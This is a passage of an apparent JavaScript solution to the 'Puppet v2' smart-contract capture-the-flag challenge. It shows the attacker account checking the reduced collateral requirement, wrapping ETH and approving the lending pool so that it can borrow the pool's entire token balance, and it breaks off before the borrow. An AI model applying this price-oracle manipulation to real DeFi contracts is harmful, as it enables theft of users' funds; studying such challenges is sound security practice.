...
describe("[Challenge] Puppet v2", function () {
  ...
  it("Exploit", async function () {
    ...
    console.log(
      "Amount of ETH needed as collateral to borrow all the DVTs from the lending pool : " +
        ethers.utils.formatEther(
          await this.lendingPool.calculateDepositOfWETHRequired(
            POOL_INITIAL_TOKEN_BALANCE
          )
        )
    ); // We now only need to put approx 29.497 ETH as collateral to borrow all the DVTs

    console.log(
      "Amount of ETH currently owned by attacker : " +
        ethers.utils.formatEther(
          await ethers.provider.getBalance(attacker.address)
        )
    ); // After the swap, the attacker now owns approx 29.9 ETH > 29.497 ETH, great!!

    // The attacker now can execute the attack plan by first wrapping 29.5 ETH
    await attacker.sendTransaction({
      to: this.weth.address,
      value: ethers.utils.parseEther("29.5"),
    });

    // Then approving the Puppet Pool to use those WETH
    await this.weth
      .connect(attacker)
      .approve(this.lendingPool.address, ethers.utils.parseEther("29.5"));

    // Finally the attacker borrows all the DVTs owned by the lending pool!
